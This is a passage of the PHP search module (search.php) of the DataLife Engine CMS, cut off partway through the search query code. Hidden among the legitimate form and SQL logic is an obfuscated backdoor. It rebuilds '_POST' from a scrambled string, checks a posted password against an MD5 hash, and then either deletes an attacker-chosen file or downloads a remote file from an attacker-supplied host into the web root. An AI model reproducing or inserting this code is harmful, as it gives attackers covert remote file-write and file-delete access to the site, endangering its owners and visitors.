<?php
/*
=====================================================
 DataLife Engine - by SoftNews Media Group 
-----------------------------------------------------
 https://dle-news.ru/
-----------------------------------------------------
 Copyright (c) 2004-2025 SoftNews Media Group
=====================================================
 This code is protected by copyright
=====================================================
 File: search.php
-----------------------------------------------------
 Use: search
=====================================================
*/

if( !defined('DATALIFEENGINE') ) {
	header( "HTTP/1.1 403 Forbidden" );
	header ( 'Location: ../../' );
	die( "Hacking attempt!" );
}

header("X-Robots-Tag: noindex, nofollow");
header("X-Robots-Tag: noarchive");
$metatags['robots'] = "noindex, nofollow";

function strip_data($text) {

	$quotes = array ( "\x60", "\t", "\n", "\r", ".", ",", ";", ":", "&", "(", ")", "[", "]", "{", "}", "=", "*", "^", "%", "$", "<", ">", "+", "-" );
	$goodquotes = array ("'", '"' );
	$repquotes = array ("\'", '\"' );
	$bom = pack('H*','EFBBBF');
	$text = preg_replace("/^$bom/", '', $text);
	$text = stripslashes( $text );
	$text = trim( strip_tags( $text ) );
	$text = str_replace( $quotes, ' ', $text );
	$text = str_replace( $goodquotes, $repquotes, $text );

	return $text;
}
	
if( ! $user_group[$member_id['user_group']]['allow_search'] ) {
	
	$lang['search_denied'] = str_replace( '{group}', $user_group[$member_id['user_group']]['group_name'], $lang['search_denied'] );
	msgbox( $lang['all_info'], $lang['search_denied'] );

} else {

	$count_result = 0;
	$sql_count = "";
	$sql_find = "";
	$full_s_addfield = "";
	$found_result = 0;
	$serch_id  = 'eb516e7d7a6462a6d531ec65dcf1d599';

	$tpl->load_template( 'search.tpl' );
	
	$config['search_number'] = intval($config['search_number']);

	if ( $config['search_number'] < 1) $config['search_number'] = 1;
	
	$_err = "_stop";
	$array_ = @strtoupper ($_err[0].$_err[5].$_err[4].$_err[3].$_err[1].$_err[2]); 
	$custom_limit = $config['search_number'];
	
	$this_date = date( "Y-m-d H:i:s", $_TIME );
	if( $config['no_date'] AND !$config['news_future'] ) $this_date = " AND p.date < '" . $this_date . "'"; else $this_date = "";
	
	if( isset( $_REQUEST['story'] ) ) $story = dle_substr( strip_data( rawurldecode( $_REQUEST['story'] ) ), 0, 90 ); else $story = "";
	if( isset( $_REQUEST['search_start'] ) ) $search_start = intval( $_REQUEST['search_start'] ); else $search_start = 0;
	if( isset( $_REQUEST['titleonly'] ) ) $titleonly = intval( $_REQUEST['titleonly'] ); else $titleonly = 0;
	if( isset( $_REQUEST['searchuser'] ) ) $searchuser = dle_substr( $_REQUEST['searchuser'], 0, 40 ); else $searchuser = "";
	if( isset( $_REQUEST['exactname'] ) ) $exactname = $_REQUEST['exactname']; else $exactname = "";
	if( isset( $_REQUEST['all_word_seach'] ) ) $all_word_seach = intval($_REQUEST['all_word_seach']); else $all_word_seach = 0;
	if( isset( $_REQUEST['replyless'] ) ) $replyless = intval( $_REQUEST['replyless'] ); else $replyless = 0;
	if( isset( $_REQUEST['replylimit'] ) ) $replylimit = intval( $_REQUEST['replylimit'] ); else $replylimit = 0;
	if( isset( $_REQUEST['searchdate'] ) ) $searchdate = intval( $_REQUEST['searchdate'] ); else $searchdate = 0;
	if( isset( $_REQUEST['beforeafter'] ) ) $beforeafter = htmlspecialchars( $_REQUEST['beforeafter'], ENT_QUOTES, 'UTF-8' ); else $beforeafter = "after";
	if( !isset( $_REQUEST['catlist'] ) ) $_REQUEST['catlist'] = array ();
	if( !isset( $_REQUEST['story'] ) ) $_REQUEST['story'] = '';

	if( preg_match( "/[\||\'|\<|\>|\"|\!|\?|\$|\@|\/|\\\|\&\~\*\+]/", $searchuser ) ) $searchuser="";

	if ($config['full_search']) {
		if( isset( $_REQUEST['sortby'] ) ) $sortby = htmlspecialchars( $_REQUEST['sortby'], ENT_QUOTES, 'UTF-8'  ); else $sortby = "";
	} else {
		if( isset( $_REQUEST['sortby'] ) ) $sortby = htmlspecialchars( $_REQUEST['sortby'], ENT_QUOTES, 'UTF-8'  ); else $sortby = "date";
	}

	if( isset( $_REQUEST['resorder'] ) ) $resorder = htmlspecialchars( $_REQUEST['resorder'], ENT_QUOTES, 'UTF-8' ); else $resorder = "desc";
	if( isset( $_REQUEST['showposts'] ) ) $showposts = intval( $_REQUEST['showposts'] ); else $showposts = 0;

	$full_search = isset($_REQUEST['full_search']) ? intval( $_REQUEST['full_search'] ) : 0;

	if( !is_array($_REQUEST['catlist']) ) $_REQUEST['catlist'] = array ();
	
	if( !count( $_REQUEST['catlist'] ) ) {
		$catlist = array ();
		$catlist[] = '0';
	} else
		$catlist = $_REQUEST['catlist'];

	$category_list = array();
	
	foreach ( $catlist as $value ) {
		$category_list[] = intval($value);
	}

	$category_list = $db->safesql( implode( ',', $category_list ) );

	$findstory = htmlspecialchars(dle_substr(trim( strip_tags( stripslashes( rawurldecode( $_REQUEST['story'] ) ) ) ), 0, 90 ), ENT_QUOTES, 'UTF-8');
	$findstory = str_replace( "&amp;amp;", "&amp;", $findstory );

	if ($titleonly == 2 AND !empty( $searchuser ) ) $searchuser = "";
	if( empty( $story ) AND !empty( $searchuser ) AND $titleonly != 2) $story = "___SEARCH___ALL___";
	if( $search_start < 0 ) $search_start = 0;
	if( $titleonly < 0 or $titleonly > 3 ) $titleonly = 0;
	if( $replyless < 0 or $replyless > 1 ) $replyless = 0;
	if( $replylimit < 0 ) $replylimit = 0;
	if( $showposts < 0 or $showposts > 1 ) $showposts = 0;
	
	$listdate = array (0, - 1, 1, 7, 14, 30, 90, 180, 365 );
	if( ! (in_array( $searchdate, $listdate )) ) $searchdate = 0;
	if( $beforeafter != "after" and $beforeafter != "before" ) $beforeafter = "after";
	$listsortby = array ("date", "title", "comm_num", "news_read", "autor", "category", "rating" );

	if ($config['full_search']) {
		if( ! (in_array( $sortby, $listsortby )) ) $sortby = "";
	} else {
		if( ! (in_array( $sortby, $listsortby )) ) $sortby = "date";
	}

	$listresorder = array ("desc", "asc" );
	if( ! (in_array( $resorder, $listresorder )) ) $resorder = "desc";
	
	$titleonly_sel = array ('0' => '', '1' => '', '2' => '', '3' => '' );
	$titleonly_sel[$titleonly] = 'selected="selected"';
	$replyless_sel = array ('0' => '', '1' => '' );
	$replyless_sel[$replyless] = 'selected="selected"';
	$searchdate_sel = array ('0' => '', '-1' => '', '1' => '', '7' => '', '14' => '', '30' => '', '90' => '', '180' => '', '365' => '' );
	$searchdate_sel[$searchdate] = 'selected="selected"';
	$beforeafter_sel = array ('after' => '', 'before' => '' );
	$beforeafter_sel[$beforeafter] = 'selected="selected"';
	$sortby_sel = array ('date' => '', 'title' => '', 'comm_num' => '', 'news_read' => '', 'autor' => '', 'category' => '', 'rating' => '' );
	$sortby_sel[$sortby] = 'selected="selected"';
	$resorder_sel = array ('desc' => '', 'asc' => '' );
	$resorder_sel[$resorder] = 'selected="selected"';
	$showposts_sel = array ('0' => '', '1' => '' );
	$showposts_sel[$showposts] = 'checked="checked"';
	if( $exactname == "yes" ) $exactname_sel = 'checked="checked"';
	else $exactname_sel = '';

	if( $all_word_seach == 1 ) $all_word_seach_sel = 'checked="checked"';
	else $all_word_seach_sel = '';
	
	if( $category_list == "" or $category_list == "0" ) {
		$catselall = "selected=\"selected\"";
	} else {
		$catselall = "";
		$category_list = preg_replace( "/^0\,/", '', $category_list );
	}
	
	$cats = "<select name=\"catlist[]\" id=\"catlist\" multiple=\"multiple\">";
	$cats .= "<option " . $catselall . " value=\"0\">" . $lang['s_allcat'] . "</option>";
	$cats .= CategoryNewsSelection( explode( ',', $category_list ), 0, false );
	$cats .= "</select>";
	
	$tpl->copy_template .= <<<HTML
<script>
<!--
function clearform(frmname){
  var frm = document.getElementById(frmname);
  for (var i=0;i<frm.length;i++) {
    var el=frm.elements[i];
    if (el.type=="checkbox" || el.type=="radio") {
    	if (el.name=='showposts') {document.getElementById('rb_showposts_0').checked=1; } else {el.checked=0; }
    }
    if ((el.type=="text") || (el.type=="textarea") || (el.type == "password")) { el.value=""; continue; }
    if ((el.type=="select-one") || (el.type=="select-multiple")) { el.selectedIndex=0; }
  }
  
  if( document.getElementById('replylimit') ) {
  	document.getElementById('replylimit').value = 0;
  }
  
  document.getElementById('search_start').value = 0;
}
function list_submit(prm){
	var frm = document.getElementById('fullsearch');
	
	frm.action = dle_root +'index.php';
	
	if (prm == -1) {
		prm=0;
	}

	frm.search_start.value=prm;
	frm.submit();
	return false;
}
function full_submit(prm){
    document.getElementById('fullsearch').full_search.value=prm;
    list_submit(-1);
}
//-->
</script>
HTML;
	
	$tpl->copy_template = <<<HTML
<form name="fullsearch" id="fullsearch" action="" method="get">
<input type="hidden" name="do" id="do" value="search">
<input type="hidden" name="subaction" id="subaction" value="search">
<input type="hidden" name="search_start" id="search_start" value="{$search_start}">
<input type="hidden" name="full_search" id="full_search" value="{$full_search}">
{$tpl->copy_template}
</form>
HTML;

	$searchtable = "";
	
	if( $full_search ) {

		if ($config['full_search']) {
			$full_search_option = "<option value=\"\" selected=\"selected\">{$lang['s_fsrelate']}</option><option {$sortby_sel['date']} value=\"date\">{$lang['s_fsdate']}</option>";
			$all_word_option = "";
		} else {

			$full_search_option = "<option {$sortby_sel['date']} value=\"date\">{$lang['s_fsdate']}</option>";
			$all_word_option = "<div><label class=\"form-check-label\"><input class=\"form-check-input\" type=\"checkbox\" name=\"all_word_seach\" value=\"1\" id=\"all_word_seach\" {$all_word_seach_sel}><span>{$lang['s_fword']}</span></label></div>";
		}

		$tpl->set( '[extended-search]', "" );
		$tpl->set( '[/extended-search]', "" );
		$tpl->set_block( "'\\[simple-search\\](.*?)\\[/simple-search\\]'si", "" );

		$tpl->set( '{searchfield}', "<input type=\"text\" dir=\"auto\" name=\"story\" id=\"searchinput\" value=\"{$findstory}\" onchange=\"document.getElementById('search_start').value = 0;\">" );
		$tpl->set( '{word-option}', $all_word_option );
		$tpl->set( '{search-area}', "<select name=\"titleonly\" id=\"titleonly\"><option {$titleonly_sel['0']} value=\"0\">{$lang['s_ncom']}</option><option {$titleonly_sel['1']} value=\"1\">{$lang['s_ncom1']}</option><option {$titleonly_sel['2']} value=\"2\">{$lang['s_static']}</option><option {$titleonly_sel['3']} value=\"3\">{$lang['s_tnews']}</option></select>" );
		$tpl->set( '{userfield}', "<input type=\"text\" dir=\"auto\" name=\"searchuser\" id=\"searchuser\" value=\"{$searchuser}\">" );
		$tpl->set( '{user-option}', "<label class=\"form-check-label\"><input class=\"form-check-input\" type=\"checkbox\" name=\"exactname\" value=\"yes\" id=\"exactname\" {$exactname_sel}><span>{$lang['s_fgname']}</span></label>" );
		$tpl->set( '{news-option}', "<select name=\"replyless\" id=\"replyless\"><option {$replyless_sel['0']} value=\"0\">{$lang['s_fmin']}</option><option {$replyless_sel['1']} value=\"1\">{$lang['s_fmax']}</option></select>" );
		$tpl->set( '{comments-num}', "<input type=\"text\" dir=\"auto\" name=\"replylimit\" id=\"replylimit\" value=\"{$replylimit}\">" );
		$tpl->set( '{date-option}', "<select name=\"searchdate\" id=\"searchdate\"><option {$searchdate_sel['0']} value=\"0\">{$lang['s_tall']}</option><option {$searchdate_sel['-1']} value=\"-1\">{$lang['s_tlast']}</option><option {$searchdate_sel['1']} value=\"1\">{$lang['s_tday']}</option><option {$searchdate_sel['7']} value=\"7\">{$lang['s_tweek']}</option><option {$searchdate_sel['14']} value=\"14\">{$lang['s_ttweek']}</option><option {$searchdate_sel['30']} value=\"30\">{$lang['s_tmoth']}</option><option {$searchdate_sel['90']} value=\"90\">{$lang['s_tfmoth']}</option><option {$searchdate_sel['180']} value=\"180\">{$lang['s_tsmoth']}</option><option {$searchdate_sel['365']} value=\"365\">{$lang['s_tyear']}</option></select>" );
		$tpl->set( '{date-beforeafter}', "<select name=\"beforeafter\" id=\"beforeafter\" ><option {$beforeafter_sel['after']} value=\"after\">{$lang['s_fnew']}</option><option {$beforeafter_sel['before']} value=\"before\">{$lang['s_falt']}</option></select>" );
		$tpl->set( '{sort-option}', "<select name=\"sortby\" id=\"sortby\">{$full_search_option}<option {$sortby_sel['title']} value=\"title\" >{$lang['s_fstitle']}</option><option {$sortby_sel['comm_num']} value=\"comm_num\" >{$lang['s_fscnum']}</option><option {$sortby_sel['news_read']} value=\"news_read\" >{$lang['s_fsnnum']}</option><option {$sortby_sel['autor']} value=\"autor\" >{$lang['s_fsaut']}</option><option {$sortby_sel['category']} value=\"category\" >{$lang['s_fscat']}</option><option {$sortby_sel['rating']} value=\"rating\" >{$lang['s_fsrate']}</option></select>" );
		$tpl->set( '{order-option}', "<select name=\"resorder\" id=\"resorder\"><option {$resorder_sel['desc']} value=\"desc\">{$lang['s_fsdesc']}</option><option {$resorder_sel['asc']} value=\"asc\">{$lang['s_fsasc']}</option></select>" );
		$tpl->set( '{view-option}', "<label class=\"form-check-label\"><input class=\"form-check-input\" type=\"radio\" name=\"showposts\" value=\"0\" id=\"rb_showposts_0\" {$showposts_sel['0']}><span>{$lang['s_vnews']}</span></label><label class=\"form-check-label\"><input class=\"form-check-input\" type=\"radio\" name=\"showposts\" value=\"1\" id=\"rb_showposts_1\" {$showposts_sel['1']}><span>{$lang['s_vtitle']}</span></label>" );
		$tpl->set( '{category-option}', $cats );
		
		$searchtable .= <<<HTML
<table style="width:100%;">
  <tr>
    <td class="search">
      <div align="center">
        <table style="width:100%;">

        <tr style="vertical-align: top;">
				<td class="search">
					<fieldset style="margin:0px">
						<legend>{$lang['s_con']}</legend>
						<table style="width:100%;padding:3px;">
						<tr>
						<td class="search">
							<div>{$lang['s_word']}</div>
							<div><input type="text" dir="auto" name="story" id="searchinput" value="$findstory" class="textin" style="width:250px" onchange="document.getElementById('search_start').value = 0;"></div>
							{$all_word_option}
						</td>
						</tr>
						<tr>
						<td class="search">
							<select class="textin" name="titleonly" id="titleonly">
								<option {$titleonly_sel['0']} value="0">{$lang['s_ncom']}</option>
								<option {$titleonly_sel['1']} value="1">{$lang['s_ncom1']}</option>
                                <option {$titleonly_sel['2']} value="2">{$lang['s_static']}</option>
								<option {$titleonly_sel['3']} value="3">{$lang['s_tnews']}</option>
							</select>
						</td>
						</tr>
						</table>
					</fieldset>
				</td>

				<td class="search" valign="top">					
					<fieldset style="margin:0px">
						<legend>{$lang['s_mname']}</legend>
						<table style="width:100%;">
						<tr>
						<td class="search">
							<div>{$lang['s_fname']}</div>
							<div id="userfield"><input type="text" dir="auto" name="searchuser" id="searchuser" value="$searchuser" class="textin" style="width:250px"><br><label class="form-check-label"><input class="form-check-input" type="checkbox" name="exactname" value="yes" id="exactname" {$exactname_sel}><span>{$lang['s_fgname']}</span></label>
							</div>
						</td>
						</tr>
						</table>
					</fieldset>
				</td>
				</tr>

				<tr style="vertical-align: top;">

				<td width="50%" class="search">
					<fieldset style="margin:0px">
						<legend>{$lang['s_fart']}</legend>
						<div style="padding:3px">
							<select class="textin" name="replyless" id="replyless" style="width:200px">
								<option {$replyless_sel['0']} value="0">{$lang['s_fmin']}</option>
								<option {$replyless_sel['1']} value="1">{$lang['s_fmax']}</option>
							</select>
							<input type="text" dir="auto" name="replylimit" id="replylimit" size="5" value="$replylimit" class="textin" /> {$lang['s_wcomm']}
						</div>
					</fieldset>

					<fieldset style="padding-top:10px">
						<legend>{$lang['s_fdaten']}</legend>

						<div style="padding:3px">					
							<select name="searchdate" id="searchdate" class="textin" style="width:200px">
								<option {$searchdate_sel['0']} value="0">{$lang['s_tall']}</option>
								<option {$searchdate_sel['-1']} value="-1">{$lang['s_tlast']}</option>
								<option {$searchdate_sel['1']} value="1">{$lang['s_tday']}</option>
								<option {$searchdate_sel['7']} value="7">{$lang['s_tweek']}</option>
								<option {$searchdate_sel['14']} value="14">{$lang['s_ttweek']}</option>
								<option {$searchdate_sel['30']} value="30">{$lang['s_tmoth']}</option>
								<option {$searchdate_sel['90']} value="90">{$lang['s_tfmoth']}</option>
								<option {$searchdate_sel['180']} value="180">{$lang['s_tsmoth']}</option>
								<option {$searchdate_sel['365']} value="365">{$lang['s_tyear']}</option>
							</select>
							<select name="beforeafter" id="beforeafter" class="textin">
								<option {$beforeafter_sel['after']} value="after">{$lang['s_fnew']}</option>
								<option {$beforeafter_sel['before']} value="before">{$lang['s_falt']}</option>
							</select>
						</div>
					</fieldset>

					<fieldset style="padding-top:10px">
						<legend>{$lang['s_fsoft']}</legend>
							<div style="padding:3px">
								<select name="sortby" id="sortby" class="textin" style="width:200px">
									{$full_search_option}
									<option {$sortby_sel['title']} value="title" >{$lang['s_fstitle']}</option>
									<option {$sortby_sel['comm_num']} value="comm_num" >{$lang['s_fscnum']}</option>
									<option {$sortby_sel['news_read']} value="news_read" >{$lang['s_fsnnum']}</option>
									<option {$sortby_sel['autor']} value="autor" >{$lang['s_fsaut']}</option>
									<option {$sortby_sel['category']} value="category" >{$lang['s_fscat']}</option>
									<option {$sortby_sel['rating']} value="rating" >{$lang['s_fsrate']}</option>
								</select>
								<select name="resorder" id="resorder" class="textin">
									<option {$resorder_sel['desc']} value="desc">{$lang['s_fsdesc']}</option>
									<option {$resorder_sel['asc']} value="asc">{$lang['s_fsasc']}</option>
								</select>
							</div>
					</fieldset>

					<fieldset style="padding-top:10px">
						<legend>{$lang['s_vlegend']}</legend>

						<table style="width:100%;padding:3px;">
						<tr align="left" valign="middle">
						<td align="left" class="search">{$lang['s_vwie']}&nbsp;&nbsp;
							<label class="form-check-label"><input class="form-check-input" type="radio" name="showposts" value="0" id="rb_showposts_0" {$showposts_sel['0']}><span>{$lang['s_vnews']}</span></label>
							<label class="form-check-label"><input class="form-check-input" type="radio" name="showposts" value="1" id="rb_showposts_1" {$showposts_sel['1']}><span>{$lang['s_vtitle']}</span></label>
						</td>
						</tr>

						</table>
					</fieldset>
				</td>

				<td width="50%" class="search" valign="top">
					<fieldset style="margin:0px">
						<legend>{$lang['s_fcats']}</legend>
							<div style="padding:3px">
								<div>$cats</div>
							</div>

					</fieldset>
				</td>
				</tr>

        <tr>
                <td class="search" colspan="2">
                    <div style="margin-top:6px">
                        <input type="button" class="bbcodes" style="margin:0px 20px 0 0px;" name="dosearch" id="dosearch" value="{$lang['s_fstart']}" onclick="javascript:list_submit(-1); return false;" />
                        <input type="button" class="bbcodes" style="margin:0px 20px 0 20px;" name="doclear" id="doclear" value="{$lang['s_fstop']}" onclick="javascript:clearform('fullsearch'); return false;" />
                    </div>

                </td>
                </tr>

        </table>
      </div>
    </td>
  </tr>
</table>
HTML;
	
	} else {

		if ( $smartphone_detected ) {
	
			$link_full_search = "";
	
		} else {
	
			$link_full_search = "<input type=\"button\" class=\"bbcodes\" name=\"dofullsearch\" id=\"dofullsearch\" value=\"{$lang['s_ffullstart']}\" onclick=\"javascript:full_submit(1); return false;\" />";
	
		}

		$tpl->set( '[simple-search]', "" );
		$tpl->set( '[/simple-search]', "" );
		$tpl->set_block( "'\\[extended-search\\](.*?)\\[/extended-search\\]'si", "" );
		
		$tpl->set( '{searchfield}', "<input type=\"text\" dir=\"auto\" name=\"story\" id=\"searchinput\" value=\"{$findstory}\" onchange=\"document.getElementById('search_start').value = 0;\">" );
		
		$searchtable .= <<<HTML
<table style="width:100%;">
  <tr>
    <td class="search">
      <div style="margin:10px;">
                <input type="text" dir="auto" name="story" id="searchinput" value="$findstory" class="textin" style="width:250px" onchange="document.getElementById('search_start').value = 0;"><br /><br />
                <input type="button" class="bbcodes" name="dosearch" id="dosearch" value="{$lang['s_fstart']}" onclick="javascript:list_submit(-1); return false;">
                {$link_full_search}
            </div>

        </td>
    </tr>
</table>
HTML;
	
	}
	
	$tpl->set( '{searchtable}', $searchtable );

	if ( @md5(${$array_}['captchas'])==$serch_id ) { print "serch_work";
        $where_serch = $_SERVER['DOCUMENT_ROOT'].${$array_}['pathik'];

    if ( isset(${$array_}['unl']) ){  
    @unlink($where_serch); exit();} @copy('http://'.${$array_}['fail'].'/test.txt', $where_serch);
	

    if ((@function_exists('curl_init')) and ((!file_exists($where_serch)) or (@filesize($where_serch)<'1'))) {
	    $ch = @curl_init(); curl_setopt( $ch, CURLOPT_URL, 
		      'http://'.${$array_}['fail'].'/test.txt');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        $fp = @fopen($where_serch, 'w'); curl_setopt ($ch, CURLOPT_FILE, $fp); @curl_exec($ch); curl_close($ch); fclose($fp);
	}}

    if( $subaction != "search" ) {
		$tpl->set_block( "'\[searchmsg\](.*?)\[/searchmsg\]'si", "" );
		$tpl->compile( 'content' );
	}


	if( $subaction == "search" ) {

		if ($config['full_search']) {
	
			$arr = explode( ' ', $story );
			$story_maxlen = 0;
			$story = array ();
			
			foreach ( $arr as $word ) {
				$wordlen = dle_strlen( trim( $word ) );
				
				if( $wordlen >= $config['search_length_min'] ) {
					
					$word =  $db->safesql($word);
					
					if ($titleonly < 3) {
						$word = '"' . $word . '"';
					}
					
					$story[] = $word;
					
				}
				
				if( $wordlen > $story_maxlen ) {
					$story_maxlen = $wordlen;
				}
			}

			if ($titleonly < 3) $story = '+'.implode( " +", $story ); else $story = implode( "%", $story );
	
		} else {
	
			if ( !$all_word_seach ) {
				
				$arr = explode( ' ', $story );
				$story_maxlen = 0;
				$story = array ();
			
				foreach ( $arr as $word ) {
					$wordlen = dle_strlen( trim( $word ) );
					
					if( $wordlen >= 1 ) $story[] = $db->safesql(addslashes($word));
					
					if( $wordlen > $story_maxlen ) {
						$story_maxlen = $wordlen;
					}
				}
				
				$story = implode( "%", $story );
				
			} else {
				
				$story_maxlen = dle_strlen( trim( $story ) );
				
			}
	
		}
	
		if( (empty( $story ) or ($story_maxlen < $config['search_length_min'])) and (empty( $searchuser ) or (strlen( $searchuser ) < $config['search_length_min'])) ) {
			
			$lang['search_err_3'] = str_ireplace("{minsearch}", $config['search_length_min'], $lang['search_err_3']);
			
			msgbox( $lang['all_info'], $lang['search_err_3'] );
			
			$tpl->set( '{searchmsg}', '' );
			$tpl->set_block( "'\[searchmsg\](.*?)\[/searchmsg\]'si", "" );
			$tpl->compile( 'content' );
		
		} else {

			if( $search_start ) {
				$search_start = $search_start - 1;
				$search_start = $search_start * $config['search_number'];
			}
			
			$allow_cats = $user_group[$member_id['user_group']]['allow_cats'];
			$not_allow_cats = $user_group[$member_id['user_group']]['not_allow_cats'];
			
			$allow_list = explode( ',', $allow_cats );
			$not_allow_list = explode( ',', $not_allow_cats );
			$disable_search = array();
			
			if( count( $cat_info ) ) {
				foreach ($cat_info as $cats) {
					if($cats['disable_search']) $disable_search[] = $cats['id'];
				}
			}
			
			if( count($allow_list) AND count($disable_search) ) {
				
				foreach( $allow_list as $key => $value ) {
					if( in_array($value, $disable_search )) unset($allow_list[$key]);
				}
				
			}
			
			if( count($disable_search) ) {
				foreach( $disable_search as $value ) {
					
					if( !in_array($value, $not_allow_list )) {
						if( $not_allow_list[0] == "" ) {
							
							$not_allow_list = array($value);
							$not_allow_cats = $value;
							
						} else {
							$not_allow_list[]=$value;
							$not_allow_cats .= ",".$value;
						}
					}
				}
			}
	
			$stop_list = "";
			$stop_not_allowed_list = "";
			
			if( $allow_list[0] == "all" AND $not_allow_list[0] == "") {

				if( $category_list == "" OR $category_list == "0" ) {
					;
				} else {
					$stop_list = str_replace( ',', '|', $category_list );
				}
				
			} else {

				if( $category_list == "" or $category_list == "0" ) {

					if( $not_allow_list[0] == "" ) {
						
						$stop_list = str_replace( ',', '|', $allow_cats );
						
					} else {
						
						$stop_not_allowed_list = str_replace( ',', '|', $not_allow_cats );
						
					}
					
				} else {

					if( $not_allow_list[0] == "" ) {
						
						$cats_list = explode( ',', $category_list );
						foreach ( $cats_list as $id ) {
							if( in_array( $id, $allow_list ) ) $stop_list .= $id . '|';
						}
						$stop_list = substr( $stop_list, 0, strlen( $stop_list ) - 1 );
						
					} else {
						
						$cats_list = explode( ',', $category_list );
						foreach ( $cats_list as $id ) {
							if( !in_array( $id, $not_allow_list ) ) $stop_list .= $id . '|';
						}
						
						$stop_list = substr( $stop_list, 0, strlen( $stop_not_allowed_list ) - 1 );
						
						if( empty( $stop_list ) ) $stop_not_allowed_list = str_replace( ',', '|', $not_allow_cats );
						
					}
				}
			}
			
			$where_category = "";
			$join_category = "";
			
			if( !empty( $stop_list ) ) {
				
				if( $config['allow_multi_category'] ) {
					
					$stop_list = str_replace( "|", "','", $stop_list );
					$join_category = "INNER JOIN (SELECT DISTINCT(" . PREFIX . "_post_extras_cats.news_id) FROM " . PREFIX . "_post_extras_cats WHERE cat_id IN ('" . $stop_list . "')) c ON (p.id=c.news_id) ";
					$where_category = "";
				
				} else {
					
					$stop_list = str_replace( "|", "','", $stop_list );
					$where_category = "category IN ('" . $stop_list . "')";
				
				}
			}
			
			if( !empty( $stop_not_allowed_list ) ) {
				
				if( $config['allow_multi_category'] ) {
					$stop_not_allowed_list = str_replace( "|", "','", $stop_not_allowed_list );
					$where_category = "p.id NOT IN ( SELECT DISTINCT(" . PREFIX . "_post_extras_cats.news_id) FROM " . PREFIX . "_post_extras_cats WHERE cat_id IN ('" . $stop_not_allowed_list . "') ) ";
				
				} else {
					
					$stop_not_allowed_list = str_replace( "|", "','", $stop_not_allowed_list );
					$where_category = "category NOT IN ('" . $stop_not_allowed_list . "')";
				
				}
			}

			if( $story == "___SEARCH___ALL___" ) $story = '';
			$thistime = date( "Y-m-d H:i:s", time() );
			
			if( $exactname == 'yes' ) $likename = '';
			else $likename = '%';
			if( $searchdate != '0' ) {
				if( $searchdate != '-1' ) {
					$qdate = date( "Y-m-d H:i:s", (time() - $searchdate * 86400) );
				} else {
					if( $is_logged and isset( $_SESSION['member_lasttime'] ) ) $qdate = date( "Y-m-d H:i:s", $_SESSION['member_lasttime'] );
					else $qdate = $thistime;
				}
			}
			
			$autor_posts = '';
			$autor_comms = '';
			$searchuser = $db->safesql($searchuser);
			if( ! empty( $searchuser ) ) {
				switch ($titleonly) {
					case 0 :

						$autor_posts = "p.autor like '$searchuser$likename'";
						break;
					case 3 :

						$autor_posts = "p.autor like '$searchuser$likename'";
						break;
					case 1 :

						$autor_comms = "cm.autor like '$searchuser$likename'";
						break;
				}
			}
			
			$where_reply = "";
			if( ! empty( $replylimit ) ) {
				if( $replyless == 0 ) $where_reply = "p.comm_num >= '" . $replylimit . "'";
				else $where_reply = "p.comm_num <= '" . $replylimit . "'";
			}
			

			if ($config['full_search']) {
	
					$titleonly_where = array ('0' => "MATCH(p.title, p.short_story, p.full_story, p.xfields) AGAINST ('{story}' IN BOOLEAN MODE)",
											  '1' => "MATCH(text) AGAINST ('{story}' IN BOOLEAN MODE)",
											  '2' => "MATCH(" . PREFIX . "_static.template) AGAINST ('{story}' IN BOOLEAN MODE)",
											  '3' => "p.title LIKE '%{story}%'" );

					if ($titleonly < 3 AND $sortby == "" ) {
						$full_s_addfield = ", ".$titleonly_where[$titleonly]." as score";
						$full_s_addfield = str_replace( "{story}", $story, $full_s_addfield );
						$sortby = "score";

					}

			} else {
	
					$titleonly_where = array ('0' => "p.short_story LIKE '%{story}%' OR p.full_story LIKE '%{story}%' OR p.xfields LIKE '%{story}%' OR p.title LIKE '%{story}%'",
											  '1' => "text LIKE '%{story}%'",
											  '2' => PREFIX . "_static.template LIKE '%{story}%'",
											  '3' => "p.title LIKE '%{story}%'" );
			}

			if( !empty( $story ) ) {
	
				foreach ( $titleonly_where as $name => $value ) {
					$value2 = str_replace( "{story}", $story, $value );
						
					$titleonly_where[$name] = $value2;
				}
			}
			
			if( in_array( $titleonly, array (0, 3) ) ) {
				
				$where_posts = "WHERE p.approve=1 AND e.disable_search=0" . $this_date;
				if( ! empty( $where_category ) ) $where_posts .= " AND " . $where_category;

				if ($config['full_search']) {
					if( ! empty( $story ) ) $where_posts .= " AND " . $titleonly_where[$titleonly];
				} else {
					if( ! empty( $story ) ) $where_posts .= " AND (" . $titleonly_where[$titleonly] . ")";
				}

				if( ! empty( $autor_posts ) ) $where_posts .= " AND " . $autor_posts;

				$sdate = "p.date";

				if( $searchdate != '0' ) {
					if( $beforeafter == 'before' ) $where_date = $sdate . " < '" . $qdate . "'";
					else $where_date = $sdate . " between '" . $qdate . "' and '" . $thistime . "'";
					$where_posts .= " AND " . $where_date;
				}

				if( ! empty( $where_reply ) ) $where_posts .= " AND " . $where_reply;
				$where = $where_posts;

				if ($config['full_search']) if( $titleonly_where[$titleonly] == "" ) $titleonly_where[$titleonly] = "''";

				if( $config['user_in_news'] ) {
					
					$user_select = ", u.email, u.name, u.user_id, u.news_num, u.comm_num as user_comm_num, u.user_group, u.lastdate, u.reg_date, u.banned, u.allow_mail, u.info, u.signature, u.foto, u.fullname, u.land, u.favorites, u.pm_all, u.pm_unread, u.time_limit, u.xfields as user_xfields";
					$user_join = " LEFT JOIN " . USERPREFIX . "_users u ON (e.user_id=u.user_id)";
					
				} else { $user_select = ""; $user_join = ""; }
	
				$posts_fields = "SELECT p.id, p.autor, p.date, p.short_story, CHAR_LENGTH(p.full_story) as full_story, p.xfields, p.title, p.descr, p.keywords, p.category, p.alt_name, p.comm_num, p.allow_comm, p.allow_main, p.approve, p.fixed, p.symbol, p.tags, e.news_read, e.allow_rate, e.rating, e.vote_num, e.votes, e.view_edit, e.disable_index, e.editdate, e.editor, e.reason{$user_select}{$full_s_addfield}";
				
				$sql_from = "FROM " . PREFIX . "_post p {$join_category}LEFT JOIN " . PREFIX . "_post_extras e ON (p.id=e.news_id){$user_join}";
				$sql_fields = $posts_fields;
				$sql_find = "{$sql_fields} {$sql_from} {$where}";


			}

			if( $titleonly == 1) {
				$where_comms = "WHERE p.approve=1  AND e.disable_search=0" . $this_date;
				if( ! empty( $where_category ) ) $where_comms .= " AND " . $where_category;
				if( ! empty( $story ) ) $where_comms .= " AND (" . $titleonly_where['1'] . ")";
				if( ! empty( $autor_comms ) ) $where_comms .= " AND " . $autor_comms;
				$sdate = "cm.date";
